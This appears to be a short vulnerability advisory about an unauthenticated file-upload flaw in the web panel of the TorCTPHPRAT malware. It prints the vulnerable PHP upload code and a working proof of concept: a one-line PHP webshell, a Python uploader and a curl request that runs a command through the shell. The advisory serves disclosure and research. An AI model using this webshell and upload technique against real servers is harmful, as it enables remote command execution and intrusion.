Threat: BuilderTorCTPHPRAT.b
Vulnerability: Arbitrary File Upload - RCE
Family: TorCTPHPRAT
Type: WebUI
MD5: 838f67d7a4b6824ec59892057aab3bb7 (Webremote TorCT Client.exe)
MD5: b54822058a3ed33c673d06113b453ebe (upload.php)
Vuln ID: MVID-2022-0519
Disclosure: 03/17/2022
Description: The TorCT client malwares web-panel allows unauthenticated
uploads and does not check the expected file type E.g. ".png". Third-party
attackers who can reach the server can upload their own backdoor PHP
webshell and execute any commands on the malwares C2 server.

"upload.php" vulnerable code:

$DelOrNot = $_GET['D'];

if ($DelOrNot == "true")
{

unlink('Upload/1.png');
unlink('Upload/2.png');
}else{

$uploadDir = 'Upload/';
$uploadFile = $uploadDir . basename($_FILES['file']['name']);
if (is_uploaded_file($_FILES['file']['tmp_name']))
{
    echo "File ". $_FILES['file']['name'] ." is successfully uploaded!\r\n";
    if (move_uploaded_file($_FILES['file']['tmp_name'], $uploadFile))
    {
        echo "File is successfully stored! ";
    }
    else print_r($_FILES);
}
else
{
    echo "Upload Failed!";
    print_r($_FILES);
}
}


Exploit/PoC:
1) Create PHP webshell "pwn.php",  exec($_GET['cmd']);

2) Create Python uploader "torct_webshell.py"
import requests

url="
http://TORCT_PHP_RAT_SERVER/BuilderTorCTPHPRAT.b/New_TorCT_6_22_1_6/UPLOAD%20%20(New%20PHP%20FILES)/upload.php
"

files = {'file': open('pwn.php', 'rb')}
r = requests.post(url, files=files)
if r.status_code==200:
    print(r.status_code)
    print("TorCTPHPRAT PWNED!")

3) Exploit
curl "
http://127.0.0.1/BuilderTorCTPHPRAT.b/New_TorCT_6_22_1_6/UPLOAD%20%20(New%20PHP%20FILES)/upload/pwn.php?cmd=calc.exe
